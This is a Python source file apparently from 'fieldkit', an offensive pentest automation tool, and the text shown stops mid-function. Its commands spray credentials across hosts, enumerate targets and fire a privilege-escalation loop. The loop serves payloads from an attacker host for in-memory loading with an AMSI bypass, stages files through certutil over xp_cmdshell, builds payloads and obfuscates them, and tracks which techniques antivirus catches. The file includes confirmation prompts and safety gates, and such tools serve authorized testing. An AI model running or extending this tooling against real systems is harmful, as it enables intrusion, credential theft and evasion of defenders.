"""The `fieldkit` command tree.

Deliberately thin: parse arguments, call into ``state``/``config``/``creds``/
``scope``, print. All logic lives in those modules so it can be tested without a
subprocess, and nothing here runs at import time.

Phase 0 surface:

    fieldkit init [name]
    fieldkit config show | get KEY | set k=v … | unset KEY
    fieldkit add cred 'CORP/jdoe:Winter2025!' | --from-file creds.txt
    fieldkit add hosts 10.0.0.0/24 | scope.txt
    fieldkit status
"""
import argparse
import os
import sqlite3
import sys

from datetime import datetime, timezone

from . import (__version__, adcs as adcs_mod, arsenal as arsenal_mod,
               bloodhound as bloodhound_mod, bridge as bridge_mod,
               classify as classify_mod, config as config_mod, creds as creds_mod,
               delegation as delegation_mod, escalate as escalate_mod,
               evasion as evasion_mod,
               executor as executor_mod, hostenum as hostenum_mod, ingest as ingest_mod,
               kb as kb_mod, kerberos as kerberos_mod, lab as lab_mod,
               mssql as mssql_mod, poc as poc_mod, preflight as preflight_mod,
               privesc as privesc_mod, report as report_mod, scope as scope_mod,
               spray as spray_mod, staging as staging_mod)
from .errors import ConfirmationError, FieldkitError
from .state import DB_ENV_VAR, Store, default_db_path

PROG = "fieldkit"


# ------------------------------------------------------------------------ plumbing

def _err(msg):
    print(f"{PROG}: error: {msg}", file=sys.stderr)


def _db_path(args):
    return args.db or default_db_path()


def _open_store(args):
    return Store.open(_db_path(args))


def _confirm(question, assume_yes=False):
    """Ask before anything is committed. Non-interactive callers must pass --yes."""
    if assume_yes:
        return True
    if not sys.stdin.isatty():
        raise ConfirmationError(
            "not running interactively and --yes was not given — refusing to guess; "
            "re-run with --yes once you have checked the parse above")
    try:
        answer = input(f"{question} [y/N] ").strip().lower()
    except EOFError:
        return False
    return answer in ("y", "yes")


def _word(n, word):
    if n == 1:
        return word
    if word.endswith("y") and word[-2:-1] not in "aeiou":
        return word[:-1] + "ies"  # opportunity -> opportunities
    return word + "s"


def _plural(n, word):
    return f"{n} {_word(n, word)}"


# ------------------------------------------------------------------------ handlers

def cmd_init(args):
    path = _db_path(args)
    if os.path.exists(path):
        _err(f"{path} already exists — remove it or use --db for a second engagement")
        return 2
    name = args.name or os.path.basename(os.path.dirname(os.path.abspath(path))) or "engagement"
    with Store.create(path) as store:
        row = store.init_engagement(name)
        print(f"created {path}")
        print(f"engagement: {row['name']}  (schema v{store.schema_version()})")
    print(f"\nnext: {PROG} config set lhost=<your ip> lport=443 domain=<ad domain>")
    print(f"      {PROG} add hosts scope.txt")
    return 0


def cmd_config_show(args):
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        data = cfg.as_dict()
        overrides = cfg.overrides()
        width = max((len(k) for k in config_mod.KEYS), default=0)
        for key in sorted(config_mod.KEYS):
            value = data.get(key)
            marker = " " if cfg.is_set(key) else "."  # '.' = default, not set
            shown = value if value is not None else "-"
            print(f"{marker} {key.ljust(width)}  {shown}")
        if overrides:
            print("\nper-subnet lhost overrides:")
            for cidr, lhost in sorted(overrides.items()):
                print(f"    {cidr}  ->  {lhost}")
        print("\n('.' marks a default that is not explicitly set)")
    return 0


def cmd_config_get(args):
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        if args.key not in config_mod.KEYS:
            _err(f"unknown config key {args.key!r} — known keys: "
                 f"{', '.join(sorted(config_mod.KEYS))}")
            return 2
        value = cfg.get(args.key)
        if value is None:
            return 1
        print(value)
    return 0


def cmd_config_set(args):
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        pairs = [config_mod.parse_assignment(a) for a in args.assignments]
        stored = cfg.set_many(pairs, subnet=args.subnet)
        scope_note = f" (for {args.subnet})" if args.subnet else ""
        for key, value in stored.items():
            print(f"{key} = {value}{scope_note}")
    return 0


def cmd_config_unset(args):
    if not args.key and not args.subnet:
        _err("give a key to unset, or --subnet to drop an lhost override")
        return 2
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        cfg.unset(args.key, subnet=args.subnet)
        print(f"unset {args.key}" + (f" for {args.subnet}" if args.subnet else ""))
    return 0


def cmd_add_cred(args):
    kwargs = dict(domain=args.domain, username=args.user, password=args.password,
                  nt_hash=args.hash, aes_key=args.aes, ccache=args.ccache,
                  ssh_key=args.ssh_key, local_auth=True if args.local else None)

    if args.from_file:
        with open(args.from_file, "r", errors="replace") as fh:
            parsed, errors = creds_mod.parse_credential_lines(fh.read(), **kwargs)
        for lineno, line, message in errors:
            _err(f"{args.from_file}:{lineno}: {message}  ({line})")
        if not parsed:
            _err("no usable credentials in the file")
            return 2
    else:
        if not args.spec and not any([args.password, args.hash, args.aes, args.ccache,
                                      args.ssh_key]):
            _err("give a credential, e.g. 'CORP/jdoe:Winter2025!' or --user jdoe --hash <NT>")
            return 2
        parsed = [creds_mod.parse_credential(args.spec, **kwargs)]

    for item in parsed:
        print(creds_mod.describe(item.credential))
        for note in item.notes:
            print(f"  note: {note}")
    if not _confirm(f"add {_plural(len(parsed), 'credential')}?", args.yes):
        print("aborted — nothing was stored")
        return 1

    with _open_store(args) as store:
        store.require_engagement()
        added = reused = 0
        with store.transaction():
            for item in parsed:
                _, created = store.add_credential(item.credential, source=args.source)
                added += created
                reused += not created
    print(f"stored {_plural(added, 'credential')}"
          + (f", {reused} already known" if reused else ""))
    return 0


def cmd_add_hosts(args):
    if not args.targets and not args.file:
        _err("nothing to add — give IPs/CIDRs or a scope file")
        return 2

    targets, errors = scope_mod.read_targets(
        args.targets, file=args.file, max_expand=args.max_expand)
    for origin, lineno, line, message in errors:
        _err(f"{origin}:{lineno}: {message}  ({line})")
    if not targets:
        _err("no usable targets found")
        return 2

    with _open_store(args) as store:
        store.require_engagement()
        added = enriched = 0
        with store.transaction():  # one commit for the whole scope file
            for ip, hostname in targets:
                _, created = store.add_host(
                    ip, hostname=hostname or None, os_name=args.os,
                    is_dc=True if args.dc else None, subnet=args.subnet)
                added += created
                enriched += not created
        total = store.counts()["hosts"]
    print(f"added {_plural(added, 'host')}"
          + (f", {enriched} already in scope" if enriched else "")
          + f" — {total} in scope now")
    return 0 if not errors else 1


def cmd_ingest_nxc(args):
    if args.file and args.file != "-":
        with open(args.file, "r", errors="replace") as fh:
            text = fh.read()
    elif sys.stdin.isatty():
        _err("no capture given — pass a file or pipe nxc output on stdin")
        return 2
    else:
        text = sys.stdin.read()

    intent = ingest_mod.classify_nxc(text)
    if not intent.hosts and not intent.creds:
        _err("nothing recognizable in that capture — no [+] auth lines or [*] banners")
        return 2

    admin = intent.admin
    print(f"read {_plural(len(intent.hosts), 'host banner')}, "
          f"{_plural(len(intent.creds), 'valid credential')}"
          + (f" ({len(admin)} admin)" if admin else ""))
    for cred, result in intent.creds:
        tag = "  (Pwn3d!)" if result.admin else ""
        print(f"  {result.proto.lower():<5} {result.ip:<15} "
              f"{cred.principal} → {creds_mod.secret_display(cred)}{tag}")

    if not _confirm("record these into the engagement?", args.yes):
        print("aborted — nothing was stored")
        return 1

    with _open_store(args) as store:
        store.require_engagement()
        rep = ingest_mod.apply_nxc(store, intent, source=args.source)
    print(f"stored {_plural(rep.creds_added, 'credential')}"
          + (f", {rep.creds_reused} already known" if rep.creds_reused else "")
          + f"; {rep.access_added} new access {_word(rep.access_added, 'record')}"
          + (f" ({rep.admin_added} admin)" if rep.admin_added else "")
          + f"; {rep.hosts_added} hosts added, {rep.hosts_enriched} enriched")
    return 0


def cmd_spray(args):
    if args.proto not in spray_mod.PROTOCOLS:
        _err(f"unknown proto {args.proto!r} — one of {', '.join(spray_mod.PROTOCOLS)}")
        return 2
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        hosts = store.hosts(subnet=args.subnet)
        creds = store.credentials()
        if not hosts:
            _err("no hosts in scope" + (f" for {args.subnet}" if args.subnet else "")
                 + " — run `fieldkit add hosts` first")
            return 2
        if not creds:
            _err("no credentials to spray — run `fieldkit add cred` first")
            return 2

        question = (f"validate {_plural(len(creds), 'credential')} across "
                    f"{_plural(len(hosts), 'host')} on {args.proto}? this runs nxc "
                    "against the client")
        if not _confirm(question, args.yes):
            print("aborted — nothing ran")
            return 1

        report = spray_mod.spray_loop(
            store, cfg, proto=args.proto, subnet=args.subnet, loot=not args.no_loot,
            with_policy=not args.no_policy, dc_ip=args.dc, timeout=args.timeout,
            on_event=lambda m: print(m))

    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\ndone in {report.rounds} round(s): "
          f"{report.valid} valid, {report.admin} admin; "
          f"looted {_plural(report.hosts_looted, 'host')}, "
          f"recovered {_plural(report.creds_recovered, 'credential')}")
    if report.creds_recovered:
        print("re-run `fieldkit spray` to chase the recovered credentials further")
    return 0


def _first_dir(v):
    return v.split(",")[0].strip() if v else v


def _stage_dirs(cfg):
    # a comma-separated stage_win/stage_lin means "try these dirs"; single-dir rendering
    # (find_vector, run) uses the first.
    return dict(stage_win=_first_dir(cfg.get("stage_win")),
                stage_lin=_first_dir(cfg.get("stage_lin")))


def _stage_dir_list(cfg, key):
    v = cfg.get(key)
    return [d.strip() for d in v.split(",") if d.strip()] if v else []


def _expand_stage_dirs(store, host_ip, host_os, cfg, vectors, dirs):
    """For each provisioned (stages/builds) vector, one copy per stage dir — so an
    'artifact didn't land' (delivery) miss advances the loop to the SAME tool in the next
    writable dir. Set e.g. `config set stage_win='C:\\Windows\\Temp,C:\\Users\\Public'`."""
    import dataclasses
    win = host_os == "windows"
    other = _first_dir(cfg.get("stage_lin" if win else "stage_win"))
    out = []
    for v in vectors:
        if not (getattr(v, "stages", ()) or getattr(v, "builds", ())):
            out.append(v)
            continue
        for d in dirs:
            kw = {"stage_win": d, "stage_lin": other} if win else \
                 {"stage_win": other, "stage_lin": d}
            v2 = privesc_mod.find_vector(store, host_ip, v.key, **kw)
            if v2:
                leaf = d.rstrip("\\/").replace("/", "\\").rsplit("\\", 1)[-1] or "dir"
                slug = "".join(c for c in leaf if c.isalnum()) or "dir"
                out.append(dataclasses.replace(v2, key=f"{v2.key}@{slug}"))
    return out


def cmd_analyze(args):
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        items = list(kb_mod.analyze(store))
        items += privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
        counts = store.counts()
    items.sort(key=lambda x: -x.score)

    if not items:
        if not counts["access"]:
            print("nothing to analyze yet — no access proven. Run `fieldkit spray` first.")
        else:
            print("no ranked opportunities from the current state — "
                  "`fieldkit enum <host>` to unlock privesc vectors.")
        return 0

    print(f"{_plural(len(items), 'move')}, best first "
          "(exploitability/safety/detection):\n")
    for i, item in enumerate(items, 1):
        where = f"  [{item.host}]" if item.host else ""
        print(f"{i}. {item.title}{where}")
        print(f"     rank: {item.axes}")
        print(f"     {item.detail}")
        if isinstance(item, privesc_mod.Vector):
            print(f"     command: {item.command}")
            if item.manual:   # prepared route — escalate won't fire it; prep renders the steps
                if item.evidence:
                    print(f"     why: {item.evidence}")
                print(f"     prep: {PROG} prep {item.host} {item.key}   (manual route)")
            else:
                print(f"     run: {PROG} run {item.host} {item.key}")
            if item.cleanup:
                print(f"     cleanup: {item.cleanup}")
        else:
            print(f"     next: {item.next_step}")
        if args.proof and item.safe_proof:
            print(f"     safe proof: {item.safe_proof}")
        print()
    return 0


def _resolve_target(store, ip):
    """(host_row, cred_row) for a target, or an error string. Shared by enum/run."""
    host = store.host_by_ip(ip)
    if host is None:
        return None, None, f"{ip} is not in scope — add it with `fieldkit add hosts`"
    cred = store.credential_with_access_on(host["id"])
    if cred is None:
        return host, None, (f"no credential is proven on {ip} — spray/validate one there "
                            "first (enum runs as a credential that already works)")
    return host, cred, None


def _facts_summary(facts):
    """One-line-per-signal digest of what enum found, for the operator."""
    lines = []
    if facts.os == hostenum_mod.LINUX:
        lines.append(f"  user: {facts.user or '?'} (uid {facts.uid})"
                     + (" — ROOT" if facts.is_root else "")
                     + (f"  groups: {', '.join(sorted(facts.groups))}" if facts.groups else ""))
        if facts.sudo_all:
            lines.append("  sudo: FULL root (ALL)")
        elif facts.sudo_binaries:
            lines.append(f"  sudo: {', '.join(sorted(facts.sudo_binaries))}"
                         + ("  NOPASSWD" if facts.sudo_nopasswd else "")
                         + (f"  env_keep={','.join(sorted(facts.sudo_env_keep))}"
                            if facts.sudo_env_keep else ""))
        if facts.suid:
            lines.append(f"  suid: {', '.join(sorted(facts.suid))}")
        if facts.caps:
            lines.append(f"  caps: {', '.join(f'{k}={v}' for k, v in sorted(facts.caps.items()))}")
        if facts.kernel:
            lines.append(f"  kernel: {facts.kernel}")
    else:
        if facts.privs:
            lines.append(f"  privileges: {', '.join(sorted(facts.privs))}")
        if facts.win_groups:
            lines.append(f"  groups: {', '.join(sorted(facts.win_groups))}")
        if facts.always_install_elevated:
            lines.append("  AlwaysInstallElevated: ON (both keys)")
        if facts.unquoted_services:
            lines.append(f"  unquoted services: {len(facts.unquoted_services)}")
    return lines


def cmd_enum(args):
    with _open_store(args) as store:
        store.require_engagement()
        host, cred, err = _resolve_target(store, args.host)
        if err:
            _err(err)
            return 2
        principal = creds_mod.Credential.from_row(cred).principal
        if not _confirm(f"enumerate {args.host} as {principal}? (read-only, runs commands "
                        "on the target)", args.yes):
            print("aborted — nothing ran")
            return 1
        report = hostenum_mod.run_enum(store, host, cred, on_event=lambda m: print(m))
        if report.blocked:
            _err(report.blocked)
            return 2
        facts = hostenum_mod.facts_for(store, host["id"])

    print(f"\nenumerated {args.host}: {_plural(len(report.ran), 'check')} captured"
          + (f", {len(report.failed)} failed" if report.failed else ""))
    summary = _facts_summary(facts)
    if summary:
        print("\n".join(summary))
    print(f"\nnext: {PROG} analyze   (ranks the privesc vectors this enum unlocked)")
    return 0


def cmd_run(args):
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        host, cred, err = _resolve_target(store, args.host)
        if err:
            _err(err)
            return 2
        vector = privesc_mod.find_vector(store, args.host, args.vector, **_stage_dirs(cfg))
        if vector is None:
            available = [v.key for v in privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
                         if v.host == args.host]
            _err(f"no vector {args.vector!r} on {args.host}"
                 + (f" — available: {', '.join(available)}" if available
                    else " — run `fieldkit enum` then `fieldkit analyze` first"))
            return 2

        allow = ["read-only"] + list(args.allow or [])
        gated = not executor_mod.gate(vector.safety, allow)
        print(f"vector: {vector.title}")
        print(f"  host {args.host}  rank {vector.axes}  safety {vector.safety}")
        print(f"  command: {vector.command}")
        if vector.cleanup:
            print(f"  cleanup: {vector.cleanup}")
        if gated:
            _err(f"{vector.safety} action blocked by the safety gate — re-run with "
                 f"--allow {vector.safety}")
            return 2
        if not _confirm(f"run this on {args.host}? (executes on the target)", args.yes):
            print("aborted — nothing ran")
            return 1

        vtype = vector.report_type or vector.key.split(":", 1)[0]
        finding_id, _ = store.add_finding(
            vtype, vector.title, host_id=host["id"], risk=vector.detection)
        creates = [(f"{vector.title} (artifact)", vector.cleanup)] if vector.cleanup else ()
        action = executor_mod.Action(
            host=host, cred=cred, command=vector.command, label=f"vector:{vector.key}",
            safety=vector.safety, shell=vector.shell, finding_id=finding_id, creates=creates)
        res = executor_mod.execute(store, action, allow=allow, on_event=lambda m: print(m))

        if res.blocked:
            _err(res.blocked)
            return 2
        verdict = classify_mod.classify(res.run, os_name=host["os"])
        if verdict.ok:
            store.add_finding(vtype, vector.title, host_id=host["id"], proven=True,
                              evidence=(res.output or "").strip()[:500])

    print("\n--- output ---")
    print((res.output or "").rstrip() or "(no output)")
    print("---")
    if verdict.ok:
        print("PROVEN: the command returned an elevated context. Captured as a finding.")
    else:
        print(f"verdict: {verdict.outcome} ({verdict.confidence} confidence) — {verdict.detail}")
        print(f"  → {verdict.guidance}")
    if vector.cleanup:
        print(f"cleanup recorded: {vector.cleanup}")
    return 0


def _host_vectors(store, cfg, host_ip):
    """The ranked privesc vectors for one host from current enum facts."""
    return [v for v in privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
            if v.host == host_ip]


def _provision_to_target(store, host, cred, local, remote, label, allow, cfg):
    """Get ``local`` onto the target at ``remote``: try smb/ssh ``--put-file`` first, then
    fall back to download-staging (serve it, target fetches over the exec transport — e.g.
    certutil over MSSQL xp_cmdshell). Returns ``(ok, note)``. Shared by escalate + prep."""
    creates = [(f"{label} at {remote}", f"del {remote}")]
    res = executor_mod.execute(
        store, executor_mod.Action(
            host=host, cred=cred, command=None, label=label,
            safety="config-change", upload=(local, remote), creates=creates),
        allow=allow, on_event=lambda m: print(m))
    if not res.blocked and res.ok:
        return True, "put-file"

    def _exec(command):
        return executor_mod.execute(
            store, executor_mod.Action(
                host=host, cred=cred, command=command, label=label,
                safety="config-change", creates=creates),
            allow=allow, on_event=lambda m: print(m))
    dres = staging_mod.download_stage(host, local, remote, lhost=cfg.get("lhost"),
                                      execute=_exec, on_event=lambda m: print(m))
    if dres is None:
        return False, (res.blocked or "no file-transfer path") + \
            " — set `config set lhost=<ip>` to download-stage over the exec transport"
    if dres.blocked or not dres.ok:
        return False, dres.blocked or "download-staging failed"
    return True, "download"


def _build_dir():
    """A scratch dir for artifacts fieldkit builds mid-loop (attacker-side)."""
    d = os.path.join(os.environ.get("FIELDKIT_BUILD", os.path.join(
        os.path.expanduser("~"), ".fieldkit", "build")))
    os.makedirs(d, exist_ok=True)
    return d


def cmd_escalate(args):
    if args.rules:
        print(escalate_mod.describe_policy())
        return 0
    if not args.host:
        _err("an IP is required (or pass --rules to see the policy)")
        return 2
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        host, cred, err = _resolve_target(store, args.host)
        if err:
            _err(err)
            return 2
        vectors = _host_vectors(store, cfg, args.host)
        if not vectors:
            _err(f"no privesc vectors on {args.host} — run `fieldkit enum {args.host}` "
                 "then `fieldkit analyze` first")
            return 2
        # a comma-separated stage_win/stage_lin → try each dir for provisioned vectors,
        # so a "didn't land" miss rolls to the same tool in the next writable dir.
        dir_key = "stage_win" if host["os"] == "windows" else "stage_lin"
        dirs = _stage_dir_list(cfg, dir_key)
        if len(dirs) > 1:
            vectors = _expand_stage_dirs(store, args.host, host["os"], cfg, vectors, dirs)
        allow = ["read-only"] + list(args.allow or [])

        # evasion posture: order delivery alternates + know which are already caught.
        now = datetime.now(timezone.utc)
        delivery_order, caught = evasion_mod.posture(store.evasion_result, host["os"], now=now)
        vectors = escalate_mod.order_deliveries(vectors, delivery_order)

        # the plan, before anything runs: what the loop would try, in order. Manual
        # routes (prep-only) are shown but never auto-fired, so they aren't "runnable".
        gated = [v for v in vectors if not executor_mod.gate(v.safety, allow)]
        runnable = [v for v in vectors
                    if executor_mod.gate(v.safety, allow) and not getattr(v, "manual", False)]
        print(f"escalation plan for {args.host} — {_plural(len(vectors), 'vector')} ranked, "
              f"blast radius {'/'.join(allow)}:")
        for v in vectors:
            if getattr(v, "manual", False):
                print(f"  {v.key:<26} {v.axes:<18} {v.safety}"
                      f"  (manual — {PROG} prep {args.host} {v.key})")
                continue
            marks = []
            if v in gated:
                marks.append(f"gated — needs --allow {v.safety}")
            if v.delivery:
                marks.append(f"delivery {v.delivery}"
                             + (" — KNOWN CAUGHT, will skip" if v.delivery in caught else ""))
            for name, _ in v.stages:
                have = "in arsenal" if arsenal_mod.find(name) else "NOT staged"
                marks.append(f"auto-stage {name} ({have})")
            for fmt, _, _ in v.builds:
                have = f"{poc_mod.BUILDER.get(fmt, '?')} ready" if poc_mod.have(fmt) \
                    else f"needs {poc_mod.BUILDER.get(fmt, 'a builder')}"
                marks.append(f"auto-build {fmt} ({have})")
            mark = ("  (" + "; ".join(marks) + ")") if marks else ""
            print(f"  {v.key:<26} {v.axes:<18} {v.safety}{mark}")
        manual = [v for v in vectors if getattr(v, "manual", False)]
        if not runnable:
            if manual:
                print(f"\n{_plural(len(manual), 'route')} here can't be auto-fired "
                      "(operator hands needed) — prepare the artifact + steps:")
                for v in manual:
                    print(f"  {PROG} prep {args.host} {v.key}")
                return 0
            _err("every vector is above the current --allow — re-run with --allow "
                 "config-change (and/or crash-risk) once you accept the blast radius")
            return 2
        if args.dry_run:
            print(f"\ndry run — nothing fired. {_plural(len(runnable), 'vector')} would run"
                  + (f"; {_plural(len(manual), 'manual route')} need `{PROG} prep`." if manual
                     else "."))
            return 0

        budget = args.max if args.max is not None else escalate_mod.DEFAULT_BUDGET
        if not _confirm(
                f"walk the escalation loop on {args.host}? fires up to "
                f"{min(budget, len(runnable))} vector(s) on the target, stopping at the "
                "first proof", args.yes):
            print("aborted — nothing ran")
            return 1

        results = {}

        def _run_vector(vector, command):
            action = executor_mod.Action(
                host=host, cred=cred, command=command,
                label=f"escalate:{vector.key}", safety=vector.safety, shell=vector.shell)
            return executor_mod.execute(store, action, allow=allow, on_event=lambda m: print(m))

        def fire(vector):
            serves = getattr(vector, "serves", ())
            if serves:
                # in-memory delivery: serve the script(s) over HTTP and let the target IEX
                # them ({url} in the command). Nothing lands on disk.
                paths = [arsenal_mod.find(n) for n in serves]
                if not all(paths):
                    missing = ", ".join(n for n, p in zip(serves, paths) if not p)
                    res = executor_mod.ExecResult(
                        blocked=f"{missing} not in the arsenal — stage it to serve in-memory")
                elif not cfg.get("lhost"):
                    res = executor_mod.ExecResult(
                        blocked="no lhost — `config set lhost=<ip>` so the target can pull "
                                "the in-memory payload")
                else:
                    directory = os.path.dirname(paths[0])
                    served = os.path.basename(paths[0])
                    amsi = evasion_mod.amsi_prefix(cfg.get("amsi_bypass"))
                    label = evasion_mod.amsi_label(cfg.get("amsi_bypass"))
                    with staging_mod.serve(directory) as port:
                        url = f"http://{cfg.get('lhost')}:{port}/"
                        print(f"  serving {served} on {cfg.get('lhost')}:{port} — "
                              f"target loads it in memory"
                              + (f"  (AMSI bypass: {label})" if label else ""))
                        command = (vector.command.replace("{amsi}", amsi)
                                   .replace("{url}", url).replace("{served}", served))
                        res = _run_vector(vector, command)
            else:
                res = _run_vector(vector, vector.command)
            results[vector.key] = res
            return res

        def mark_caught(technique):
            store.record_evasion(technique, "caught",
                                 detail=f"caught live during escalation on {args.host} "
                                        f"({now.date().isoformat()})")

        def put_file(local, remote, label):
            return _provision_to_target(store, host, cred, local, remote, label, allow, cfg)

        def stage(vector):
            done = []
            for name, remote in vector.stages:
                local = arsenal_mod.find(name)
                if not local:
                    return escalate_mod.StageResult(
                        False, f"{name} not in the arsenal — `fieldkit arsenal` to fetch it")
                ok, how = put_file(local, remote, f"stage:{name}")
                if not ok:
                    return escalate_mod.StageResult(False, how)
                done.append(f"{name}→{remote} ({how})")
            return escalate_mod.StageResult(True, "staged " + ", ".join(done))

        arch = "x86" if cfg.get("arch") == "x86" else "x64"

        def build(vector, corrected):
            done = []
            for fmt, remote, bcmd in vector.builds:
                use_arch = "x86" if (corrected and arch == "x64") else \
                    ("x64" if corrected else arch)
                out = os.path.join(_build_dir(), f"{vector.key.replace(':', '_')}.{fmt}")
                bres = poc_mod.build(fmt, out, arch=use_arch, command=bcmd,
                                     lhost=cfg.get("lhost"), lport=cfg.get("lport"))
                if not bres.ok:
                    return escalate_mod.StageResult(False, bres.detail)
                ok, how = put_file(out, remote, f"build:{fmt}")
                if not ok:
                    return escalate_mod.StageResult(False, how)
                done.append(f"{fmt}({bres.tool})→{remote} ({how})")
            return escalate_mod.StageResult(True, "built+staged " + ", ".join(done))

        print("\n--- escalating ---")
        outcome = escalate_mod.escalate(
            vectors, fire=fire, allow=allow, os_name=host["os"], budget=budget,
            delivery_order=delivery_order, caught=caught, mark_caught=mark_caught,
            stage=None if args.no_stage else stage,
            build=None if args.no_stage else build, on_event=lambda m: print(m))

        if outcome.ok:
            v = outcome.proven
            vtype = v.report_type or v.key.split(":", 1)[0]
            res = results[v.key]
            evidence = (res.output or "").strip()[:500]
            finding_id, _ = store.add_finding(vtype, v.title, host_id=host["id"],
                                              proven=True, evidence=evidence)
            if res.step_id is not None:  # link the captured proof step (anti-fabrication)
                store.attach_step(res.step_id, finding_id)
            if v.cleanup:
                store.add_artifact(f"{v.title} (artifact)", cleanup_cmd=v.cleanup,
                                   host_id=host["id"])

    _print_escalation_outcome(outcome)
    return 0 if outcome.ok else 1


def _print_escalation_outcome(outcome):
    print("\n--- trail ---")
    for a in outcome.attempts:
        if a.verdict is not None:
            print(f"  {a.action:<8} {a.vector.key:<24} {a.verdict.outcome} — {a.note}")
        else:
            print(f"  {a.action:<8} {a.vector.key:<24} {a.note}")
    print("---")
    if outcome.ok:
        v = outcome.proven
        print(f"PROVEN: {v.title} elevated on {v.host}. Recorded as a finding"
              + (f"; cleanup: {v.cleanup}" if v.cleanup else "") + ".")
    elif outcome.stopped == "surfaced":
        print("STOPPED: a result the classifier does not recognise — shown above. "
              "Inspect it before continuing (`fieldkit arsenal rules`).")
    elif outcome.stopped == "budget":
        print("STOPPED: attempt budget reached before proof — raise it with --max or "
              "narrow the plan.")
    else:
        print("no vector proved elevation — every ranked move was tried. See the trail "
              "for the per-vector verdict and its recommended manual step.")
    if not outcome.ok and any(a.verdict and a.verdict.axis == "delivery"
                              for a in outcome.attempts):
        print("\nan artifact didn't land at the stage dir. Try more writable dirs — the loop "
              "walks each one:\n  fieldkit config set "
              "stage_win='C:\\Windows\\Temp,C:\\Users\\Public,C:\\ProgramData'\n"
              "then re-run. If it's AV eating the payload (common with Potatoes), that's an "
              "evasion problem, not a dir problem — see `fieldkit poc` / posture.")
    manual = [a for a in outcome.attempts if a.action == escalate_mod.MANUAL]
    if manual:
        print(f"\n{_plural(len(manual), 'manual route')} can't be auto-fired — prepare "
              "the artifact + steps with:")
        for a in manual:
            print(f"  {PROG} prep {a.vector.host} {a.vector.key}")


def cmd_prep(args):
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        host, cred, err = _resolve_target(store, args.host)
        if host is None:
            _err(err)
            return 2
        if args.stage and err:            # staging needs proven access; building doesn't
            _err(err)
            return 2
        vector = privesc_mod.find_vector(store, args.host, args.vector, **_stage_dirs(cfg))
        if vector is None:
            available = [v.key for v in _host_vectors(store, cfg, args.host)
                         if v.builds or v.manual]
            _err(f"no vector {args.vector!r} on {args.host}"
                 + (f" — preparable: {', '.join(available)}" if available
                    else " — run `fieldkit enum` then `fieldkit analyze` first"))
            return 2
        # preparable = fieldkit builds the artifact, or the route needs operator hands
        # (a manual route's artifact comes from the arsenal instead of a build).
        if not vector.builds and not vector.manual:
            _err(f"{vector.key} has nothing to prepare — it's auto-fireable "
                 f"(`{PROG} run {args.host} {vector.key}` or `{PROG} escalate`)")
            return 2

        arch = "x86" if cfg.get("arch") == "x86" else "x64"
        built = []
        for fmt, remote, bcmd in vector.builds:
            out = os.path.join(_build_dir(), f"{vector.key.replace(':', '_')}.{fmt}")
            bres = poc_mod.build(fmt, out, arch=arch, command=bcmd,
                                 lhost=cfg.get("lhost"), lport=cfg.get("lport"))
            if not bres.ok:
                _err(f"build failed ({bres.tool}): {bres.detail}")
                return 1
            built.append([fmt, out, remote, bres.tool, None])
        # arsenal-sourced artifacts (a staged PoC, e.g. a lin-kernel exploit): resolve the
        # local copy so prep can name it and optionally push it. Not fetched = say so.
        for name, remote in vector.stages:
            local = arsenal_mod.find(name)
            built.append([name, local or f"<not in arsenal: exploits/fetch.sh --only {name}>",
                          remote, "arsenal", None])

        if args.stage:
            if not _confirm(f"upload {_plural(len(built), 'artifact')} to {args.host} "
                            "(writes to the target)?", args.yes):
                print("built locally; not staged (declined)")
                args.stage = False
            else:
                for entry in built:
                    fmt, out, remote = entry[0], entry[1], entry[2]
                    if not os.path.exists(out):     # unresolved arsenal artifact
                        entry[4] = None
                        continue
                    # put-file, or download-stage over the exec transport (e.g. MSSQL-only).
                    ok, how = _provision_to_target(
                        store, host, cred, out, remote, f"prep:{fmt}",
                        ["read-only", "config-change"], cfg)
                    if not ok:
                        _err(f"stage failed: {how}")
                        return 1
                    entry[4] = f"{remote} ({how})"

    _render_prep(vector, built)
    return 0


def _render_prep(vector, built):
    pb = vector.playbook
    print(f"\n=== prep: {vector.title} ===")
    if pb:
        print(pb.summary)
    print("\nartifacts (attacker-side):")
    for fmt, out, remote, tool, staged in built:
        print(f"  {fmt:<4} {out}   (via {tool})")
        if staged:
            print(f"       staged on target → {staged}")
        else:
            print(f"       copy it to the target yourself → {remote}")
    if not pb:
        return
    print(f"\nplace at: {pb.place}")
    print("steps:")
    for i, step in enumerate(pb.steps, 1):
        print(f"  {i}. {step}")
    if pb.restore:
        print(f"\nrestore/cleanup: {pb.restore}")


def cmd_preflight(args):
    rows = preflight_mod.check()
    print("preflight — external tools fieldkit drives:\n")
    for label, found, alts, required in rows:
        if found:
            mark, val = "OK ", found
        elif required:
            mark, val = "!! ", "MISSING — required"
        else:
            mark, val = "-- ", "not installed"
        alt = f"   (any of: {', '.join(alts)})" if not found and len(alts) > 1 else ""
        print(f"  {mark} {label:<40} {val}{alt}")
    missing = preflight_mod.missing_required(rows)
    print("\nbuild toolchain detail: `fieldkit poc --check`   ·   "
          "staged exploits: `fieldkit arsenal check`")
    if missing:
        print(f"\n{_plural(len(missing), 'required tool')} missing — the credential loop "
              "needs netexec + impacket.")
        return 1
    return 0


def cmd_poc(args):
    if args.check:
        print("build toolchain — which builders are installed:\n")
        for tool, path in poc_mod.toolchain():
            print(f"  {'OK ' if path else '-- '} {tool:<28} {path or 'not on PATH'}")
        conf = poc_mod.confuser(args.confuser)
        print(f"  {'OK ' if conf else '-- '} {'ConfuserEx (obfuscate)':<28} "
              f"{conf or 'not found — set confuser_cli / --confuser (+ mono for a .exe)'}")
        print("\nformats: " + ", ".join(f"{f} ({b})" for f, b in sorted(poc_mod.BUILDER.items())))
        return 0
    if args.obfuscate:  # ConfuserEx: obfuscate a compiled .NET assembly (e.g. a Potato .exe)
        src = args.obfuscate
        if not os.path.exists(src):  # allow naming an arsenal artifact instead of a path
            resolved = arsenal_mod.find(src)
            if resolved:
                src = resolved
